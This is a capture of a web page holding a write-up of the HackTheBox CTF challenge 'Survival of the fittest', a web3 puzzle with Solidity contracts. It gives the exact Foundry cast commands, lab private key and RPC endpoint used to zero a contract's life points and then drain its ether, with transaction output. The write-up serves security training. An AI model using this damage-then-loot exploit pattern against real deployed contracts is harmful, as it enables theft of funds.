+<h2 id="section-final-step-retrieve-the-flag"><a href="#section-final-step-retrieve-the-flag" class="heading-link">Final Step — Retrieve the Flag</a></h2>
+<p>Accessing <code>/flag</code> yields:</p>
+<div class="reader-code"><div class="reader-code-toolbar"><span>Code</span><button type="button" aria-label="Copy code"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-copy"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg> Copy</button><span role="status" class="sr-only"></span></div><pre tabindex="0" aria-label="Code block, horizontally scrollable"><code>HTB{g0&lt;SNIP&gt;0d}
+</code></pre></div></div><dialog class="reader-image-dialog" aria-label="Enlarged article image"><button type="button" class="reader-image-close" aria-label="Close image"><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-x"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button></dialog></div></div></div></main></div><!--/$--></div></div><script id="article-data" type="application/json">{"kind":"ctf","entry":{"id":"fittest","title":"Fittest","competition":"HackTheBox","category":"web3","difficulty":"easy","points":100,"tags":["Solidity","Smart Contracts","Foundry","EVM"],"date":"2025-11-16","summary":"Defeat a vulnerable smart‑contract creature by reducing its life points and looting its balance using a single strong attack.","contentPath":"fittest.md","previewImage":"/assets/previews/ctf-fittest.png","kind":"ctf","folder":"ctf","route":"ctf/fittest"},"route":"ctf/fittest","content":"# Blockchain - Survival of the fittest Writeup \n\n---\n\n## Description\n\nAlex had always dreamed of becoming a warrior, but she wasn't particularly skilled. When the opportunity arose to join a group of seasoned warriors on a quest to a mysterious island filled with real-life monsters, she hesitated. But the thought of facing down fearsome beasts and emerging victorious was too tempting to resist, and she reluctantly agreed to join the group. As they made their way through the dense, overgrown forests of the island, Alex kept her senses sharp, always alert for the slightest sign of danger. But as she crept through the underbrush, sword drawn and ready, she was startled by a sudden movement ahead of her. She froze, heart pounding in her chest as she realized that she was face to face with her first monster.\n\n---\n\n# Knowledge\n\n**Solidity** is the dominant language for writing smart contracts on EVM-based chains.\n\nTo interact with the challenge contracts we require:\n\n- A **private key**\n    \n- The **contract address** we want to interact with\n    \n- A valid **RPC endpoint**\n    \n\n---\n\n## Installing Foundry\n\nFoundry is a smart-contract development and interaction toolkit. It allows dependency management, compilation, testing, deploying, and on-chain interaction via CLI tools like `cast`.\n\nOfficial page: https://getfoundry.sh/introduction/installation\n\nInstallation:\n\n```bash\ncurl -L https://foundry.paradigm.xyz | bash\n```\n\n---\n\n# Provided Connection Data\n\nFrom `/connection`:\n\n```json\n{\n    \"PrivateKey\": \"0x8d445a23e04e86321ccd28dcae768437323b8077efef9253a390b0cc20f6063f\",\n    \"Address\": \"0xA4bdaB97F1851D49FD3822BcDCc140342b1A25CD\",\n    \"TargetAddress\": \"0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b\",\n    \"setupAddress\": \"0xf0Bc69214C06B85b67e36363b716fBe16B9d4f37\"\n}\n```\n\n---\n\n# Challenge Code Analysis\n\n## Setup.sol\n\nKey points:\n\n- Deploys a `Creature` contract.\n    \n- Sends 1 ether into the challenge.\n    \n- Challenge is solved when the `Creature` contract balance reaches 0.\n    \n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport {Creature} from \"./Creature.sol\";\n\ncontract Setup {\n    Creature public immutable TARGET;\n\n    constructor() payable {\n        require(msg.value == 1 ether);\n        TARGET = new Creature{value: 10}();\n    }\n    \n    function isSolved() public view returns (bool) {\n        return address(TARGET).balance == 0;\n    }\n}\n```\n\n---\n\n## Creature.sol\n\nThis contract is the “monster” to defeat.\n\nImportant mechanics:\n\n- Starts with **20 life points (LP)**.\n    \n- You reduce LP via:\n    \n    - `punch()` → 1 damage\n        \n    - `strongAttack(uint256 dmg)` → custom damage\n        \n- After LP reaches zero, `loot()` transfers the contract’s entire balance to you.\n    \n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Creature {\n    \n    uint256 public lifePoints;\n    address public aggro;\n\n    constructor() payable {\n        lifePoints = 20;\n    }\n\n    function strongAttack(uint256 _damage) external{\n        _dealDamage(_damage);\n    }\n    \n    function punch() external {\n        _dealDamage(1);\n    }\n\n    function loot() external {\n        require(lifePoints == 0, \"Creature is still alive!\");\n        payable(msg.sender).transfer(address(this).balance);\n    }\n\n    function _dealDamage(uint256 _damage) internal {\n        aggro = msg.sender;\n        lifePoints -= _damage;\n    }\n}\n```\n\n---\n\n# Exploitation Logic\n\nTo win:\n\n1. Reduce `lifePoints` from **20 → 0**.  \n    Instead of calling `punch()` twenty times, use `strongAttack()` with a single large damage value.\n    \n2. Once `lifePoints == 0`, call `loot()` to drain the contract balance.\n    \n\n---\n\n# Using Foundry (`cast`) for Contract Interaction\n\n`cast send` allows sending state-changing transactions and signing them with your private key:\n\nGeneral form:\n\n```\ncast send \u003ccontract\u003e \"\u003cfunction()\u003e\" --rpc-url \u003cRPC\u003e --private-key \u003cPK\u003e\n```\n\nWith arguments:\n\n```\ncast send \u003ccontract\u003e \"\u003cfunction(type)\u003e\" \u003carg\u003e --rpc-url \u003cRPC\u003e --private-key \u003cPK\u003e\n```\n\n---\n\n# Step 1 — Deal 20 Damage\n\nCommand:\n\n```bash\ncast send 0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b \\\n\"strongAttack(uint256)\" 20 \\\n--rpc-url http://83.136.255.53:42964/rpc \\\n--private-key 0x8d445a23e04e86321ccd28dcae768437323b8077efef9253a390b0cc20f6063f\n```\n\n```\nblockHash            0xb2c70ba1271d365ca1d3995ccc0cd409c41d3a5b908d234718b69884c6a635c4  \nblockNumber          2  \ncontractAddress         \ncumulativeGasUsed    43933  \neffectiveGasPrice    1  \nfrom                 0xA4bdaB97F1851D49FD3822BcDCc140342b1A25CD  \ngasUsed              43933  \nlogs                 []  \nlogsBloom            0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  \n000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  \n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  \nroot                    \nstatus               1 (success)  \ntransactionHash      0xed34430fa0cddc41e1a419e12ba2167ceb22d6cd1fa739e7cee18fe91460e165  \ntransactionIndex     0  \ntype                 2  \nblobGasPrice         1  \nblobGasUsed             \nto                   0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b  \nroot                 1130364050475552944130524530114546590354513137440874816785034123020356937009\n```\n\nSuccessful transaction output confirms the LP reduction.\n\n---\n\n# Step 2 — Loot the Creature\n\n```bash\ncast send 0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b \\\n\"loot()\" \\\n--rpc-url http://83.136.255.53:42964/rpc \\\n--private-key 0x8d445a23e04e86321ccd28dcae768437323b8077efef9253a390b0cc20f6063f\n```\n\n```\nblockHash            0x6a819605e299a550b2edbcdab61bc74338a90201e423d11ed8ebffb19ff76b10  \nblockNumber          3  \ncontractAddress         \ncumulativeGasUsed    30240  \neffectiveGasPrice    1  \nfrom                 0xA4bdaB97F1851D49FD3822BcDCc140342b1A25CD  \ngasUsed              30240  \nlogs                 []  \nlogsBloom            0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  \n000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  \n0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000  \nroot                    \nstatus               1 (success)  \ntransactionHash      0x5f643659598d0257324a195c9340280a399dabe12d8f211c7da76c7ca126499c  \ntransactionIndex     0  \ntype                 2  \nblobGasPrice         1  \nblobGasUsed             \nto                   0x6bA5C468F3E159df8F1d2F458ca2a852118B3b1b  \nroot                 65448156146837092794561661644493978257801831892458926913137380377893969569969\n```\n\nThis transfers the remaining ether to your address, satisfying the challenge condition.\n\n---\n# Final Step — Retrieve the Flag\n\nAccessing `/flag` yields:\n\n```\nHTB{g0\u003cSNIP\u003e0d}\n```\n"}</script>
+    
+    <!-- Cloudflare Web Analytics -->
+    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "6090182987b5451bb264dcd59cd2b600"}'></script>
+  </body>
+</html>
